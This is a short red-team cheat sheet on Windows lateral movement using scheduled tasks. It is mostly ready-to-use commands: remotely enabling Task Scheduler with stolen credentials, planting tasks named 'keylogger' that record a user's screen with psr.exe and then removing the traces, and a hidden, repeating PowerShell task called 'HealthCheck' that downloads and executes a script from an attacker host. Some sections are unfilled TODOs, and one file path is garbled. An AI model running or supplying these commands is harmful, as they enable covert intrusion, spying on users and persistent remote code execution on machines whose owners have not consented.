---
author(s):
  - Userware
tags:
  - post-exploitation
  - lateral-movement
  - schedule-task
  - windows
---
# Living off the Land

## 01 - Conditions

> [!IMPORTANT] Conditions
> Ensure the `Task Scheduler` is running. Here are the commands. Here are the commands to enable it.

```
C:\> net.exe use \\<IP>\IPC$ /user:<username> <password>
sc.exe \\<IP> config Schedule start= auto
sc.exe \\<IP> start Schedule
```

## 02 - Command Prompt

### 2.1 - Execute Payload

TODO: Fill this info

```

```

### 2.2 - Scenarios

#### 2.2.1 - Screenshots via User Activity

Taking screenshots via **Living off the Land (LofL)**.

```
C:\> net.exe time \\<IP>

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { Get-Date }

C:\> schtasks.exe /create /tn "keylogger" /tr "C:\Windows\System32\psr.exe /start /gui 0 /output C:\path\to\file.zip" /sc once /st 00:00 /it [/ru <DOMAIN>\<username>] [/rp <password>] /s <target_IP>

C:\> schtasks.exe /run /tn "keylogger" [/ru <DOMAIN>\<username>] [/rp <password>] /s <IP>
```

Create schedule task to stop taking screenshots.

```
C:\> schtasks.exe /create /tn "stop_keylogger" /tr "C:\Windows\systSystem32em32\psr.exe /stop" /sc once /st 00:00 /it [/ru <DOMAIN>\<username>] [/rp <password>] /s <target_IP>

C:\> schtasks.exe /run /tn "stop_keylogger" [/ru <DOMAIN>\<username>] [/rp <password>] /s <IP>
```

Delete schedule tasks.

```
C:\> schtasks.exe /delete /f /tn "keylogger" /s <IP>

C:\> schtasks.exe /delete /f /tn "stop_keylogger" /s <IP>
```

Confirm schedule tasks are removed.

```
C:\> schtasks.exe /query /tn "keylogger" /fo List /v /s <IP>

C:\> schtasks.exe /query /tn "stop_keylogger" /fo List /v /s <IP>
```

## 03 - PowerShell

### 3.1 - Execute Payload

TODO: Fill this info

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle hidden -c `"IEX (New-Object Net.WebClient).DownloadString('http[s]://<attacker_IP>/payload.ps1')`""

$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 3)
$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "HealthCheck"
```

---
## References

### LOFLCAB

- [LOFLCAB: `schtasks.exe`](https://lofl-project.github.io/loflcab/Binaries/schtasks/)

- [LOFLCAB: `net.exe`](https://lofl-project.github.io/loflcab/Binaries/net/)

### evilcomrade

- [evilcomrade: Windows Lateral Movement Fu](https://1evilcomrade.blogspot.com/2017/11/windows-lateral-movement-fu.html)

### Riccardo Ancarani

- [Riccardo Ancarani: Red Team Adventures - Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)